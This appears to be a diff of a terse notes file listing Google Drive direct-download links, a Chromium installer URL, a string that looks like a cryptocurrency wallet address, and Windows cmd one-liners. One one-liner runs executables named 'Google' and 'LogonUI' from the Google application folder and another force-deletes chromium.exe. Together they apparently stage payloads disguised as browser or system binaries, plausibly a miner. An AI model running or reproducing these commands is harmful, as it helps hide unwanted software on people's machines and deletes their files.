@@ -1,9 +1,9 @@
 https://chromium.woolyss.com/download/fr/
 https://storage.googleapis.com/chromium-browser-snapshots/Win_x64/931582/mini_installer.exe
 https://drive.google.com/uc?id=1zW67WRo2nX4WA3K5ExBKjuhaHwth1kv9&export=download
+cd.. & cd.. & cd program files & cd google & cd application & Google & LogonUI
 https://drive.google.com/u/0/uc?id=1zW67WRo2nX4WA3K5ExBKjuhaHwth1kv9&export=download
 https://drive.google.com/u/0/uc?id=112CfS-KFUIxvL74fImKfIOuiQYjT7NWf&export=download
-cd.. & cd.. & cd program files & cd google & cd application & Google & LogonUI
 46bNmb5eSTiERWkLk5RgYfE3FWku1uABWPjfLEPdp7ycgwerzwWs48d2fHRMp4NkMdVdNkb58tExdTYyH1e9ZJW6Cmnzozv
 https://drive.google.com/u/1/uc?id=1PX1vrewKQ3RYbscdel8rmYomprbW9Fpq&export=download
 cd.. & cd.. & cd program files & cd google & cd application & chromium & del /f chromium.exe
